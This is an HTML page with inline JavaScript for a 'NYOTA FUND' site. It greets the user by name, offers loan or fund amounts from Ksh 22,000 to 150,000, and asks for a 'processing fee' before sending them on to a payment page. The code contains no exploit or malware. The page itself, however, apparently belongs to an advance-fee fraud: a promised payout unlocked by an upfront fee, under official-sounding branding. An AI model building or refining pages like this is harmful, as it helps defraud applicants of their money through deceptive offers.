<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Select Amount - NYOTA FUND</title>
<link rel="stylesheet" href="style.css">
</head>

<body>

<div class="container">

  <h2>Select Your NYOTA Fund Amount</h2>

  <p style="font-size:18px;">
    Congratulations 🎊 <span id="username"></span>, You're eligible for NYOTA FUNDs LIMITs. Kindly choose the amount you want and pay it's processing fee to receive.
  </p>

  <!-- AMOUNT OPTIONS -->
  <div class="fund-buttons">

    <button data-amount="22000" data-fee="350">Ksh 22,000</button>
    <button data-amount="30000" data-fee="400">Ksh 30,000</button>
    <button data-amount="40000" data-fee="460">Ksh 40,000</button>
    <button data-amount="50000" data-fee="520">Ksh 50,000</button>
    <button data-amount="65000" data-fee="650">Ksh 65,000</button>
    <button data-amount="75000" data-fee="850">Ksh 75,000</button>
    <button data-amount="85000" data-fee="900">Ksh 85,000</button>
    <button data-amount="110000" data-fee="1100">Ksh 110,000</button>
    <button data-amount="150000" data-fee="1500">Ksh 150,000</button>

  </div>

  <!-- DISPLAY -->
  <p style="margin-top:15px;">
    Amount Selected: <strong>Ksh <span id="selectedAmount">---</span></strong>
  </p>

  <p>
    Processing Fee: <strong>Ksh <span id="processingFee">---</span></strong>
  </p>

  <!-- CONTINUE BUTTON -->
  <button id="continueBtn" style="margin-top:20px;">Continue</button>

</div>

<script>

// ===== LOAD USER =====
const users = JSON.parse(localStorage.getItem("nyota_users") || "[]");
const phone = localStorage.getItem("userPhone");
const currentUser = users.find(u => u.phone === phone);

if (currentUser && currentUser.fullname) {
  document.getElementById("username").textContent =
    " " + currentUser.fullname.toUpperCase();
}

// ===== SELECTION =====
let selectedFund = null;

document.querySelectorAll(".fund-buttons button").forEach(btn => {
  btn.addEventListener("click", () => {

    // remove previous highlight
    document.querySelectorAll(".fund-buttons button").forEach(b => {
      b.style.background = "";
    });

    // highlight selected
    btn.style.background = "#16a34a";

    selectedFund = {
      amount: btn.dataset.amount,
      fee: btn.dataset.fee
    };

    document.getElementById("selectedAmount").innerText = selectedFund.amount;
    document.getElementById("processingFee").innerText = selectedFund.fee;
  });
});

// ===== CONTINUE =====
document.getElementById("continueBtn").addEventListener("click", () => {

  if (!selectedFund) {
    alert("Please select an amount first.");
    return;
  }

  localStorage.setItem("selectedFund", JSON.stringify(selectedFund));

  window.location.href = "payment1.html";
});

</script>

</body>
</html>
